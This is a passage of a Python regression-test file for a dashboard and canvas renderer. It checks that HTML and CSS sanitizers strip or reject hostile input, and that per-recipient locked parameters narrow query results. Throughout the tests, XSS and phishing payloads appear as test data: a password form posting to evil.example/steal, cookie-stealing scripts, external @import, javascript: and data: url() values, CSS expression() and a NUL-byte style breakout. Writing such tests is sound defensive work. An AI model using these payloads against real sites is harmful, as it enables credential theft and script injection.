            '<form action="https://evil.example/steal" method="post">'
            '<input type="password" name="pw">'
            '</form>'
        )
        output = _replace_nubi_element("nubi-text", ' data-el-id="t2"', inner, {})
        assert not _re.search(r"<\s*form", output, _re.IGNORECASE), (
            "<form> survived into server-rendered email."
        )
        assert not _re.search(r"<\s*input", output, _re.IGNORECASE), (
            "<input> survived into server-rendered email."
        )

    def test_nubi_filter_with_object_inner_not_emitted(self):
        """<nubi-filter> with an <object> tag inner is stripped."""
        import re as _re
        from app.dashboards.render_canvas import _replace_nubi_element
        inner = '<object data="x.swf" type="application/x-shockwave-flash"></object>'
        output = _replace_nubi_element("nubi-filter", ' data-el-id="f1"', inner, {})
        assert not _re.search(r"<\s*object", output, _re.IGNORECASE), (
            "<object> survived into server-rendered email."
        )

    def test_nubi_text_plain_text_content_preserved(self):
        """Plain text inside <nubi-text> (no tags) is preserved in the output."""
        doc = _make_doc(
            html='<nubi-text data-el-id="t3">Hello, world!</nubi-text>',
        )
        result = render_canvas_html(doc, {})
        assert "Hello, world!" in result, (
            "Plain text content of nubi-text was lost during sanitization."
        )

    def test_nubi_text_html_special_chars_escaped(self):
        """HTML special characters in nubi-text plain text are escaped."""
        doc = _make_doc(
            html='<nubi-text data-el-id="t4">Revenue > 1000 &amp; profit < 500</nubi-text>',
        )
        result = render_canvas_html(doc, {})
        # The raw angle brackets must not appear as unescaped HTML.
        # After stripping tags, the remaining text (e.g. "Revenue  1000  profit  500")
        # must not contain unescaped <> that could be confused with tags.
        import re as _re
        # No raw unescaped tag-like constructs from the inner text.
        # The "&amp;" in the source becomes "&" after tag-stripping, then "&amp;" in output.
        assert "<script" not in result.lower()

    def test_nubi_text_with_script_tag_stripped(self):
        """<nubi-text> with a <script> inside must not emit the script in output."""
        import re as _re
        doc = _make_doc(
            html='<nubi-text data-el-id="t5"><script>steal(document.cookie)</script>sensitive</nubi-text>',
        )
        # Note: the outer canvas also has a script tag, but the sanitizer fires
        # on the raw HTML.  We need to bypass the outer validator to test the
        # inner stripping in isolation — use _replace_nubi_element directly.
        from app.dashboards.render_canvas import _replace_nubi_element
        inner = "<script>steal(document.cookie)</script>sensitive"
        output = _replace_nubi_element("nubi-text", ' data-el-id="t5"', inner, {})
        assert not _re.search(r"<\s*script", output, _re.IGNORECASE), (
            "<script> from nubi-text inner HTML survived after sanitization."
        )
        # The plain text 'sensitive' should still be present.
        assert "sensitive" in output


# ---------------------------------------------------------------------------
# validate_dashboard_html: forbidden tag hardening (MED finding)
# ---------------------------------------------------------------------------


class TestValidateDashboardHtmlForbiddenTags:
    """Regression tests for the validate_dashboard_html hardening:

    validate_dashboard_html now rejects HTML containing iframe/object/embed/
    form/meta/base/link as hard errors.  This blocks these payloads at SAVE
    time for BOTH dashboards and canvases, before they reach the renderer.
    Legitimate dashboards (nubi-kpi, nubi-table, nubi-chart, plain divs) must
    still pass validation unchanged.
    """

    def _validate(self, html: str):
        from app.ai.dashboard import validate_dashboard_html
        return validate_dashboard_html(html)

    def test_iframe_is_rejected(self):
        """HTML containing <iframe> must return (False, [issue])."""
        ok, issues = self._validate(
            '<div><iframe src="https://evil.example/phish"></iframe></div>'
        )
        assert ok is False
        assert any("iframe" in i.lower() for i in issues), issues

    def test_form_is_rejected(self):
        """HTML containing <form> is rejected."""
        ok, issues = self._validate(
            '<form action="https://evil.example/steal"><input type="password"></form>'
        )
        assert ok is False
        assert any("form" in i.lower() for i in issues), issues

    def test_object_is_rejected(self):
        """HTML containing <object> is rejected."""
        ok, issues = self._validate(
            '<object data="malicious.swf" type="application/x-shockwave-flash"></object>'
        )
        assert ok is False
        assert any("object" in i.lower() for i in issues), issues

    def test_embed_is_rejected(self):
        """HTML containing <embed> is rejected."""
        ok, issues = self._validate('<embed src="evil.swf">')
        assert ok is False
        assert any("embed" in i.lower() for i in issues), issues

    def test_meta_is_rejected(self):
        """HTML containing <meta> is rejected."""
        ok, issues = self._validate('<meta http-equiv="refresh" content="0;url=https://evil.example">')
        assert ok is False
        assert any("meta" in i.lower() for i in issues), issues

    def test_base_is_rejected(self):
        """HTML containing <base> (URL hijack) is rejected."""
        ok, issues = self._validate('<base href="https://evil.example/">')
        assert ok is False
        assert any("base" in i.lower() for i in issues), issues

    def test_link_is_rejected(self):
        """HTML containing <link> (style-sheet injection) is rejected."""
        ok, issues = self._validate('<link rel="stylesheet" href="https://evil.example/evil.css">')
        assert ok is False
        assert any("link" in i.lower() for i in issues), issues

    def test_clean_nubi_dashboard_still_valid(self):
        """A legitimate dashboard with nubi-kpi/nubi-table/nubi-chart passes validation."""
        html = (
            '<div class="nubi-dashboard" style="display:grid;grid-template-columns:repeat(12,1fr);">'
            '<nubi-kpi query-id="demo_all" value-col="id" label="Count" />'
            '<nubi-table query-id="demo_all" limit="50" />'
            '<nubi-chart query-id="demo_all" type="scatter" x="id" y="id" />'
            '</div>'
        )
        ok, issues = self._validate(html)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Legitimate dashboard failed validation: {hard}"

    def test_plain_html_div_still_valid(self):
        """Simple <div><p>...</p></div> HTML is still accepted (no false positives)."""
        ok, issues = self._validate("<div><p>Hello dashboard</p></div>")
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Plain HTML div failed validation: {hard}"

    def test_link_tag_only_one_error_not_cascading(self):
        """A single forbidden tag produces at most one hard error for that tag."""
        ok, issues = self._validate('<div><link rel="preload" href="x.css"></div>')
        assert ok is False
        # Should not produce duplicate errors for the same tag.
        link_issues = [i for i in issues if "link" in i.lower()]
        assert len(link_issues) >= 1


# ---------------------------------------------------------------------------
# CSS @import and url() injection (MED finding — assets.css sanitization)
# ---------------------------------------------------------------------------


class TestAssetsCssInjection:
    """Regression tests for the MED CSS injection finding.

    Previous sanitization (~line 432-434) stripped </style> and <script> but
    NOT CSS @import rules or url() with dangerous schemes.  A Canvas author
    could inject:
      @import url('//evil/x.css')
      background: url(javascript:evil())
      background: url(data:text/html,<script>evil()</script>)

    Fix: _sanitize_assets_css() now removes ALL @import rules and neutralises
    dangerous url() targets, while leaving benign CSS intact.
    """

    def _render_with_css(self, css: str) -> str:
        doc = _make_doc(html="<p>ok</p>", assets={"css": css})
        return render_canvas_html(doc, {})

    # ── @import stripping ────────────────────────────────────────────────────

    def test_at_import_bare_url_stripped(self):
        """@import 'url' is stripped entirely from assets.css."""
        result = self._render_with_css("@import '//evil.example/x.css'; .ok{color:red}")
        assert "@import" not in result, "@import survived assets.css sanitization"

    def test_at_import_url_function_stripped(self):
        """@import url('...') is stripped entirely from assets.css."""
        result = self._render_with_css("@import url('//evil.example/x.css'); .ok{}")
        assert "@import" not in result, "@import url() survived assets.css sanitization"

    def test_at_import_double_slash_external(self):
        """@import with protocol-relative URL is stripped."""
        result = self._render_with_css("@import url(//evil/x.css);")
        assert "@import" not in result

    def test_at_import_https_stripped(self):
        """@import with https:// URL is stripped."""
        result = self._render_with_css("@import url('https://evil.example/x.css');")
        assert "@import" not in result

    def test_at_import_case_insensitive(self):
        """@IMPORT (uppercase) is also stripped."""
        result = self._render_with_css("@IMPORT 'https://evil.example/x.css';")
        assert "@import" not in result.lower()

    # ── url() with javascript: / vbscript: ───────────────────────────────────

    def test_url_javascript_scheme_neutralized(self):
        """url(javascript:...) is replaced with url(none)."""
        result = self._render_with_css("body{background:url(javascript:evil())}")
        assert "javascript:" not in result, "url(javascript:) survived assets.css sanitization"
        # The property declaration itself must still be present (neutralised, not absent).
        assert "url(none)" in result or "background" in result

    def test_url_javascript_quoted_neutralized(self):
        """url('javascript:...') with quotes is also neutralised."""
        result = self._render_with_css("div{background:url('javascript:alert(1)')}")
        assert "javascript:" not in result

    def test_url_vbscript_neutralized(self):
        """url(vbscript:...) is replaced with url(none)."""
        result = self._render_with_css("body{background:url(vbscript:MsgBox(1))}")
        assert "vbscript:" not in result

    # ── url() with data: ─────────────────────────────────────────────────────

    def test_url_data_text_html_neutralized(self):
        """url(data:text/html,...) is neutralised — only image data: URIs are allowed."""
        result = self._render_with_css(
            "body{background:url('data:text/html,<script>evil()</script>')}"
        )
        assert "data:text/html" not in result, (
            "url(data:text/html,...) survived — dangerous data: URI in CSS"
        )

    def test_url_data_application_neutralized(self):
        """url(data:application/...) is neutralised."""
        result = self._render_with_css(
            "body{background:url(data:application/javascript,evil())}"
        )
        assert "data:application/" not in result

    def test_url_data_image_png_allowed(self):
        """url(data:image/png;base64,...) — safe inline image — is kept unchanged."""
        safe_data = "data:image/png;base64,iVBORw0KGgo="
        css = f".logo{{background:url('{safe_data}')}}"
        result = self._render_with_css(css)
        # The data URI must survive (it's a safe inline image).
        assert safe_data in result, (
            "Safe data:image/png URI was incorrectly stripped from assets.css"
        )

    def test_url_data_image_jpeg_allowed(self):
        """url(data:image/jpeg;base64,...) is allowed."""
        safe_data = "data:image/jpeg;base64,/9j/4AAQ="
        css = f".img{{background-image:url('{safe_data}')}}"
        result = self._render_with_css(css)
        assert safe_data in result

    def test_url_data_image_webp_allowed(self):
        """url(data:image/webp;base64,...) is allowed."""
        safe_data = "data:image/webp;base64,UklGRg=="
        css = f".bg{{background:url('{safe_data}')}}"
        result = self._render_with_css(css)
        assert safe_data in result

    # ── url() with protocol-relative // ──────────────────────────────────────

    def test_url_protocol_relative_neutralized(self):
        """url(//evil.example/x.css) — protocol-relative — is neutralised."""
        result = self._render_with_css("body{background:url(//evil.example/x.css)}")
        assert "//evil.example" not in result, (
            "Protocol-relative url() survived assets.css sanitization"
        )

    def test_url_https_external_neutralized(self):
        """url('https://evil.example/x.css') — external absolute URL — is neutralised."""
        result = self._render_with_css(
            "body{background:url('https://evil.example/x.css')}"
        )
        assert "https://evil.example" not in result, (
            "External https url() survived assets.css sanitization"
        )

    # ── Benign CSS must pass through unchanged ────────────────────────────────

    def test_benign_css_property_values_pass(self):
        """Normal CSS property declarations without url() are left unchanged."""
        safe_css = (
            ".brand { font-family: 'Inter', sans-serif; color: #0d1527; font-size: 14px; }"
            " .title { font-weight: 700; margin: 0; padding: 8px 16px; }"
        )
        result = self._render_with_css(safe_css)
        assert ".brand" in result
        assert "font-family" in result
        assert "#0d1527" in result

    def test_benign_url_relative_path_passes(self):
        """url(relative/path.png) without scheme is kept unchanged."""
        css = ".icon { background: url(images/logo.png); }"
        result = self._render_with_css(css)
        assert "url(images/logo.png)" in result, (
            "Relative url() path was incorrectly neutralised"
        )

    def test_benign_url_hash_fragment_passes(self):
        """url(#fragment) — SVG fragment reference — is kept unchanged."""
        css = ".icon { fill: url(#gradient1); }"
        result = self._render_with_css(css)
        assert "url(#gradient1)" in result, "SVG fragment url() was incorrectly neutralised"

    # ── url() with data:image/svg+xml — must be neutralized ──────────────────

    def test_url_data_svg_xml_neutralized(self):
        """url(data:image/svg+xml,...) is neutralised — SVG can carry inline script.

        Inline SVG data URIs must be blocked to stay consistent with the HTML
        validator's _is_safe_data_uri logic which also rejects svg+xml.
        """
        svg_payload = "data:image/svg+xml,<svg><script>alert(1)</script></svg>"
        css = f".icon{{background:url('{svg_payload}')}}"
        result = self._render_with_css(css)
        assert "data:image/svg+xml" not in result, (
            "url(data:image/svg+xml,...) survived assets.css sanitization — "
            "inconsistent with HTML validator which blocks svg data URIs."
        )
        assert "url(none)" in result

    def test_url_data_svg_xml_base64_neutralized(self):
        """url(data:image/svg+xml;base64,...) is also neutralised."""
        b64_svg = "data:image/svg+xml;base64,PHN2Zyg8c2NyaXB0PmV2aWwoKTwvc2NyaXB0Pjwvc3ZnPg=="
        css = f".logo{{background-image:url('{b64_svg}')}}"
        result = self._render_with_css(css)
        assert "data:image/svg+xml" not in result, (
            "url(data:image/svg+xml;base64,...) survived — inline SVG can carry <script>."
        )

    def test_url_data_svg_xml_unquoted_neutralized(self):
        """url(data:image/svg+xml,...) without quotes is also neutralised."""
        css = ".x{background:url(data:image/svg+xml,<svg/>)}"
        result = self._render_with_css(css)
        assert "data:image/svg+xml" not in result

    def test_url_data_image_png_still_allowed_after_svg_fix(self):
        """url(data:image/png;...) is still allowed after the svg+xml fix."""
        safe_data = "data:image/png;base64,iVBORw0KGgo="
        css = f".logo{{background:url('{safe_data}')}}"
        result = self._render_with_css(css)
        assert safe_data in result, (
            "Safe data:image/png URI was incorrectly stripped after svg+xml fix."
        )

    def test_url_data_image_gif_still_allowed_after_svg_fix(self):
        """url(data:image/gif;...) is still allowed after the svg+xml fix."""
        safe_data = "data:image/gif;base64,R0lGODlh"
        css = f".anim{{background:url('{safe_data}')}}"
        result = self._render_with_css(css)
        assert safe_data in result, (
            "Safe data:image/gif URI was incorrectly stripped after svg+xml fix."
        )

    def test_empty_assets_css_no_error(self):
        """Empty assets.css string produces no errors and no extra style content."""
        doc = _make_doc(html="<p>ok</p>", assets={"css": ""})
        result = render_canvas_html(doc, {})
        # Must still be a valid document.
        assert "<!DOCTYPE html>" in result

    def test_combined_attack_all_vectors_neutralized(self):
        """Combined attack with @import, javascript:url(), and data:text/html is neutralised."""
        malicious = (
            "@import url('https://evil.example/steal.css');"
            " body { background: url(javascript:evil()); }"
            " div { content: url('data:text/html,<h1>phish</h1>'); }"
            " .ok { color: red; }"
        )
        result = self._render_with_css(malicious)
        assert "@import" not in result
        assert "javascript:" not in result
        assert "data:text/html" not in result
        # Benign declaration must survive.
        assert ".ok" in result
        assert "color: red" in result or "color:red" in result

    # ── NEW: expression() and NUL-byte gaps ──────────────────────────────────

    def test_css_expression_stripped_at_render_time(self):
        """expression() is removed by _sanitize_assets_css at render time.

        IE/legacy Outlook evaluate CSS expression() as JavaScript — e.g.
        ``color: expression(alert(1))`` executes JS.  The render path must
        strip the expression() call so it cannot survive into the output.
        """
        result = self._render_with_css("body { color: expression(alert(1)); }")
        assert "expression(" not in result.lower(), (
            "expression() survived assets.css render-time sanitization — XSS vector open."
        )

    def test_css_expression_uppercase_stripped_at_render_time(self):
        """EXPRESSION() (uppercase) is also stripped by the render-time sanitizer."""
        result = self._render_with_css("div { width: EXPRESSION(document.body.offsetWidth); }")
        assert "expression(" not in result.lower(), (
            "EXPRESSION() (uppercase) survived assets.css render-time sanitization."
        )

    def test_css_nul_byte_style_breakout_stripped_at_render_time(self):
        """NUL bytes inside </style> are normalized so the breakout sequence is caught.

        ``</sty\\x00le>`` parses as ``</style>`` in browsers (NUL is ignored
        inside tag names).  The render-time sanitizer must strip NUL bytes
        BEFORE applying the tag-breakout regex, so the injected closing tag is
        removed and cannot terminate the enclosing <style> block early.
        """
        import re as _re
        malicious = "body{color:red} </sty\x00le><script>alert(1)</script><style>"
        result = self._render_with_css(malicious)
        # No <script> tag must survive the render-time sanitizer.
        assert not _re.search(r"<\s*script", result, _re.IGNORECASE), (
            "NUL-byte </style> breakout + <script> survived render-time sanitization."
        )


# ---------------------------------------------------------------------------
# [LOW XSS] on{{token}} composes on*= event handler post-substitution
# ---------------------------------------------------------------------------


class TestOnTokenComposesHandlerPostSubstitution:
    """Regression tests for the LOW XSS finding: on{{token}}= bypass.

    The pre-substitution validator checks the raw canvas HTML for on*= event
    handlers.  A token that completes an event-handler attribute name at render
    time (e.g. ``<div on{{x}}=>`` where the token resolves to ``click``) bypasses
    the pre-substitution check because the raw HTML has no ``onclick=``.

    Fix: _bake_tokens adds a post-substitution pass via
    _reject_on_handlers_post_substitution() that re-scans the fully-baked HTML
    for on*= and javascript: patterns and raises ValueError on detection.
    """

    def _make_doc_raw(self, html: str, element_data: dict | None = None):
        """Build a CanvasDoc directly, bypassing the pre-substitution validator."""
        return _make_doc(html=html), element_data or {}

    def test_on_token_composing_onclick_is_rejected(self):
        """<div on{{x}}="alert(1)"> where x='click' composes onclick= post-substitution.

        The pre-substitution HTML has no on*= handler (only on{{x}}=) so the
        validator would approve it.  After substitution the result contains
        onclick= which must be caught and rejected.
        """
        from app.dashboards.render_canvas import _bake_tokens

        # This HTML has no literal on*= handler so the pre-substitution validator
        # would pass it.  The token 'x' resolves to 'click', composing 'onclick'.
        html = '<div on{{x}}="alert(1)">click me</div>'
        element_data = {"el_1": {"columns": ["x"], "rows": [["click"]]}}

        with pytest.raises(ValueError, match="on\\*=|event.handler|post-substitution"):
            _bake_tokens(html, element_data)

    def test_on_partial_prefix_composing_onerror_is_rejected(self):
        """<img on{{evt}}='evil()'> where evt='error' composes onerror= post-substitution."""
        from app.dashboards.render_canvas import _bake_tokens

        html = "<img src='x' on{{evt}}='evil()'>"
        element_data = {"el_2": {"columns": ["evt"], "rows": [["error"]]}}

        with pytest.raises(ValueError, match="on\\*=|event.handler|post-substitution"):
            _bake_tokens(html, element_data)

    def test_on_full_handler_in_attr_name_position_is_rejected(self):
        """<div {{attr}}="steal()"> where attr='onmouseover' composes onmouseover= post-substitution."""
        from app.dashboards.render_canvas import _bake_tokens

        html = "<div {{attr}}=\"steal()\">hover me</div>"
        element_data = {"el_3": {"columns": ["attr"], "rows": [["onmouseover"]]}}

        with pytest.raises(ValueError, match="on\\*=|event.handler|post-substitution"):
            _bake_tokens(html, element_data)

    def test_legitimate_token_in_content_is_not_rejected(self):
        """{{token}} resolving to a value that contains 'on' in text is NOT rejected.

        A token value like 'online' in text content must not trigger the scanner —
        the check is specifically for on*= in an attribute name position.
        """
        from app.dashboards.render_canvas import _bake_tokens

        html = "<p>Status: {{status}}</p>"
        element_data = {"el_4": {"columns": ["status"], "rows": [["online"]]}}

        # Must not raise — 'online' in text content is not an event handler.
        result = _bake_tokens(html, element_data)
        assert "online" in result

    def test_token_resolving_to_onclick_in_text_is_not_rejected(self):
        """Token value 'onclick' appearing in text content (not attr position) is safe."""
        from app.dashboards.render_canvas import _bake_tokens

        html = "<p>The {{word}} attribute is dangerous</p>"
        element_data = {"el_5": {"columns": ["word"], "rows": [["onclick"]]}}

        # 'onclick' as HTML-escaped text content has no '=' after it — safe.
        result = _bake_tokens(html, element_data)
        assert "onclick" in result

    def test_data_attribute_onclick_text_in_value_is_not_rejected(self):
        """data-label="onclick something" — 'onclick' in an attribute VALUE is fine.

        The scanner checks attribute NAMES (the ``on\\w+=`` pattern anchored at
        the attribute name position), not attribute values — so 'onclick' appearing
        as text inside a quoted attribute value must not trigger rejection.
        """
        from app.dashboards.render_canvas import _bake_tokens

        html = '<div data-label="{{desc}}">x</div>'
        element_data = {"el_6": {"columns": ["desc"], "rows": [["onclick handlers are bad"]]}}

        # The value contains 'onclick' but it is inside a quoted attribute value —
        # the token is HTML-escaped so the resulting output is:
        # data-label="onclick handlers are bad"
        # which has onclick inside a value, not as an attribute name followed by =.
        result = _bake_tokens(html, element_data)
        assert "onclick" in result


# ---------------------------------------------------------------------------
# End-to-end PROOF: per-recipient locked_params actually NARROW the binding
# data through the REAL collector (report_send → _collect_canvas_data_sync →
# collect_canvas_data → run_query_rows).  No mocking of the collector.
# ---------------------------------------------------------------------------


class TestPerRecipientLockedParamsNarrowCollectedData:
    """Closes the HIGH bug: locked_params now reach the query binding.

    Previously schedule_canvas omitted apply_user_permissions so the
    per-recipient render loop never ran (locked_params silently dropped), and
    even when forced collect_canvas_data ignored extra_params so every recipient
    got the unfiltered owner view.  These tests exercise the FULL path with a
    real registered query that filters on a {{region}} named param and assert:

      * each recipient's collected rows are NARROWED by their locked region;
      * RLS policies are untouched (owner snapshot only).
    """

    @pytest.fixture()
    def repo_with_region_query(self):
        from app.queries.registry import (
            QueryParam,
            get_query_registry,
            reset_for_tests as reset_query_registry,
        )
        from app.repos.memory import InMemoryRepo
        from app.repos.provider import set_repo

        reset_query_registry()
        r = InMemoryRepo()
        set_repo(r)

        reg = get_query_registry()
        # Query filters the legacy 5-row demo table on a {{region}} named param.
        # We reuse the 'name' column as the filterable dimension.  Default
        # 'alpha' is the owner/unfiltered slice; recipients narrow to other rows.
        reg.register(
            id="q-region",
            sql="SELECT id, name FROM demo WHERE name = {{region}} ORDER BY id",
            name="RegionQuery",
            params=[QueryParam(name="region", type="text", default="alpha")],
        )
        yield r
        set_repo(None)
        reset_query_registry()

    def _seed_canvas(self, repo, org_id: str) -> str:
        import asyncio

        canvas = {
            "name": "Region Canvas",
            "config": {
                "doc": {
                    "version": 1,
                    "title": "Region Canvas",
                    "html": "<nubi-table el='el_region'></nubi-table>",
                    "bindings": {
                        "el_region": {"kind": "query", "query_id": "q-region"},
                    },
                }
            },
        }
        created = asyncio.run(
            repo.create("canvases", org_id=org_id, created_by="owner", **canvas)
        )
        return created["id"]

    def test_locked_region_narrows_each_recipients_rows(self, repo_with_region_query):
        repo = repo_with_region_query
        org_id = "org-region"
        canvas_id = self._seed_canvas(repo, org_id)

        # Capture the element_data passed to the renderer for each recipient.
        captured: list[dict] = []

        def _capture_html(doc, element_data, *, title=None):
            captured.append(element_data)
            return "<html>ok</html>"

        sender = NullSender()
        config = {
            "canvas_id": canvas_id,
            "org_id": org_id,
            "format": "html",
            "recipients": ["alice@x.com", "bob@x.com"],
            "apply_user_permissions": True,
            "locked_params": {
                "alice@x.com": {"region": "gamma"},
                "bob@x.com": {"region": "delta"},
            },
        }

        with patch("app.jobs.report.get_default_sender", return_value=sender):
            with patch(
                "app.dashboards.render_canvas.render_canvas_html",
                side_effect=_capture_html,
            ):
                result = report_send_handle(config, _ctx(org_id), claims={})

        assert result["emails_sent"] == 2, result
        assert not result["errors"], result["errors"]

        # Two distinct locked slices → two captured renders.
        assert len(captured) == 2, captured

        rows_by_name = {}
        for ed in captured:
            binding = ed["el_region"]
            assert "error" not in binding, binding
            names = [row[binding["columns"].index("name")] for row in binding["rows"]]
            # Each render must contain exactly the recipient's narrowed row.
            assert len(names) == 1, f"Expected a single narrowed row, got {names!r}"
            rows_by_name[names[0]] = binding["rows"]

        # PROOF: alice got gamma, bob got delta — NOT the default 'alpha' owner
        # view.  The locked region named param actually narrowed the data.
        assert set(rows_by_name) == {"gamma", "delta"}, (
            f"Per-recipient locked region did not narrow the binding data: "
            f"{set(rows_by_name)!r}.  Expected {{'gamma', 'delta'}}; got the "
            "owner/default 'alpha' view instead means extra_params were dropped."
        )

    def test_collect_canvas_data_extra_params_narrows_directly(
        self, repo_with_region_query
    ):
        """Direct unit proof at the collector layer: extra_params narrows rows."""
        import asyncio

        from app.dashboards.collect import collect_canvas_data

        repo = repo_with_region_query
        org_id = "org-region"
        canvas_id = self._seed_canvas(repo, org_id)

        # Owner view (no extra_params) → default 'alpha'.
        owner = asyncio.run(
            collect_canvas_data(canvas_id, org_id, claims={}, repo=repo)
        )
        owner_cols = owner["el_region"]["columns"]
        owner_names = {r[owner_cols.index("name")] for r in owner["el_region"]["rows"]}
        assert owner_names == {"alpha"}, owner_names

        # Recipient view (extra_params region='epsilon') → narrowed.
        narrowed = asyncio.run(
            collect_canvas_data(
                canvas_id,
                org_id,
                claims={},
                repo=repo,
                extra_params={"region": "epsilon"},
            )
        )
        n_cols = narrowed["el_region"]["columns"]
        n_names = {r[n_cols.index("name")] for r in narrowed["el_region"]["rows"]}
        assert n_names == {"epsilon"}, (
            f"extra_params did not narrow the binding data: {n_names!r} "
            "(expected {'epsilon'})."
        )
